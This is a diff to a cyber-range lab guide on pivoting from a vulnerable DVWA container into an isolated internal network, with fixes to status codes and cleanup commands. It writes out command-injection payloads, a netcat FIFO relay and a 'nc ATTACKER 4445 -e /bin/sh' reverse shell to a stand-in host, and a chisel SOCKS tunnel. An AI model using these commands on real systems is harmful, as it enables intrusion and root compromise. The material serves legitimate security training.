@@ -86,7 +86,7 @@ The range is split into three Docker networks. DVWA is the **only** service with
 
 Expected reachability from your remote seat:
 - **From your machine (`[attacker]`)**: only the published DMZ ports on `SERVER` answer. `10.5.20.x` and `10.5.15.x` are **not** routable - try `curl --max-time 3 http://SERVER` style probes and the intranet simply times out. That dead end is the point.
-- **From DVWA (`[DVWA]`)**: the whole intranet is reachable - `10.5.20.10` (HTTP 200), `10.5.20.12` (many open ports), `10.5.20.2:51821` (401 unauth = reachable). DVWA is your bridge across that gap.
+- **From DVWA (`[DVWA]`)**: the whole intranet is reachable - `10.5.20.10` (HTTP 200), `10.5.20.12` (many open ports), `10.5.20.2:51821` (wg-easy v15 answers `302` and redirects to `/login` = reachable; its `/api/session` endpoint returns `401`). DVWA is your bridge across that gap.
 - Check which tools DVWA has before relying on them - run through the web command channel: `127.0.0.1; command -v nc; command -v curl; command -v python3; command -v php`. PHP is sufficient for enumeration; Python and netcat availability depends on the image.
 - Two documented exceptions worth knowing (see `CyberRange/README.md`): blackbox-exporter is dual-homed (`10.5.10.20:9115`, abusable `/probe` endpoint). Grafana provisions a wg-easy authorization header in `secureJsonData`; this is not a plaintext credential disclosure through its UI. Mailpit has no authentication configured here.
 
@@ -146,8 +146,9 @@ The simplest pivot: make DVWA run `curl` for you. No special tooling, no extra c
 [DVWA]  127.0.0.1; curl -s -I http://10.5.20.12/
 [DVWA]  127.0.0.1; curl -s -I http://10.5.20.12:8180/
 
-# wg-easy admin UI is reachable (401 = alive, needs auth)
+# wg-easy admin UI is reachable (302 = redirect to /login, i.e. alive)
 [DVWA]  127.0.0.1; curl -s -o /dev/null -w "%{http_code}\n" http://10.5.20.2:51821/
+# (its API returns a clean 401: ...curl ... http://10.5.20.2:51821/api/session)
 
 # sftpgo web UI
 [DVWA]  127.0.0.1; curl -s -o /dev/null -w "%{http_code}\n" http://10.5.20.11:8080/
@@ -159,7 +160,7 @@ Notes:
 ## Pivot 2: Reverse shell relayed through DVWA with netcat
 Metasploitable2 has no published ports, so you cannot touch it from your seat - but DVWA can, and it can also reach back to you. Use tri-homed DVWA as the middle box to bridge metasploitable2's root bindshell (TCP `1524`) out to a listener on your machine. Commands below use OpenBSD netcat syntax; the listener on macOS also accepts `nc -l 4445`.
 
-1. **`[attacker]`** On your machine, listen:
+1. **`[attacker]`** On your machine, listen (`nc -lvnp 4445` on Linux; on macOS use `nc -l 4445`):
    ```bash
    nc -lvnp 4445
    ```
@@ -167,9 +168,17 @@ Metasploitable2 has no published ports, so you cannot touch it from your seat - 
    ```
    127.0.0.1; (rm -f /tmp/p; mkfifo /tmp/p; nc 10.5.20.12 1524 </tmp/p | nc ATTACKER 4445 >/tmp/p) &
    ```
-3. **`[attacker]`** Back in your listener, type `id`. Expect `uid=0(root)` - a root shell on an internal host, reached from outside with nothing but a web bug on DVWA. Type `exit` and Ctrl-C the listener when done; clean the relay with `[DVWA] 127.0.0.1; pkill -f /tmp/p; rm -f /tmp/p`.
+   **Expect this request to hang (the page keeps "loading").** That is normal: the two `nc` processes hold the request's output stream open, so the request *is* your live tunnel. Run it from a **second Command Injection tab / second webshell** so your main `[DVWA]` channel stays usable, and leave that tab open while you work. (Metasploitable2 is an emulated legacy host and can be slow to accept the connection - give it a few seconds, and retry the relay if the shell does not appear.)
+3. **`[attacker]`** Back in your listener, type `id`. Expect `uid=0(root)` - a root shell on an internal host, reached from outside with nothing but a web bug on DVWA. Type `exit` and Ctrl-C the listener when done.
+4. **Clean up.** From a **fresh** `[DVWA]` channel (not the hung one) or as `[operator]` on the server, kill the relay and remove the FIFO:
+   ```
+   127.0.0.1; pkill -x nc; rm -f /tmp/p
+   ```
+   Note: target the `nc` processes by name (`pkill -x nc`). A `pkill -f /tmp/p` does **not** work here - it matches (and kills) its own injection shell before finishing, and it never matches the two `nc` processes, whose command lines are `nc 10.5.20.12 1524` and `nc ATTACKER 4445` (no `/tmp/p` in them).
 
 Why it works: the `nc ... | nc ...` pair plus the FIFO forms a two-way bridge. One direction alone (a single `nc | nc`) only forwards one way and cannot carry an interactive shell. Metasploitable2's `1524` bindshell is already a shell, so no `-e` is needed on DVWA's netcat (OpenBSD `nc` does not have `-e` anyway). If a target instead needs to *connect back*, the same idea applies: have it run `nc ATTACKER 4445 -e /bin/sh` and catch it directly.
+
+If you only want a quick root check on metasploitable2 (not an interactive session), skip the relay and use the one-shot bindshell call in Phase 4 below - it returns the output straight on the DVWA page, with no listener and no hanging request.
 
 ## Pivot 3: Full dynamic SOCKS pivot
 A reverse SOCKS tunnel lets the TCP clients on **your** machine reach internal services through DVWA without a VPN. DVWA opens the tunnel *outbound* to you, so nothing new has to be published on the server.
@@ -195,7 +204,7 @@ Obtain matching [Chisel release binaries](https://github.com/jpillora/chisel/rel
    ```
    Expect the wiki HTML or an installation redirect. Point your browser at SOCKS5 `127.0.0.1:1080` to explore the internal web services. For proxychains, configure `socks5 127.0.0.1 1080`; a bounded scan is `proxychains4 nmap -sT -Pn -n -p 80,22 10.5.20.12`. SOCKS carries TCP only - no raw SYN scans or ICMP discovery.
 
-Tear down afterwards: stop the chisel client and server, stop the `http.server`, and remove the binary with `[DVWA] 127.0.0.1; pkill -f /tmp/chisel; rm -f /tmp/chisel /tmp/chisel.log`.
+Tear down afterwards: stop the chisel client and server, stop the `http.server`, and remove the binary with `[DVWA] 127.0.0.1; pkill -x chisel; rm -f /tmp/chisel /tmp/chisel.log` (use `pkill -x chisel`, not `pkill -f /tmp/chisel`: the latter also matches its own injection shell and can kill it before the `rm` runs).
 
 SSH `-D` is an alternative only after an SSH endpoint is reachable. A direct `ssh -D ... 10.5.20.12` from your seat cannot establish the first pivot - the host is not routable until the tunnel exists. SFTPGo is a file transfer service, not a general SSH shell/tunneling server.
 
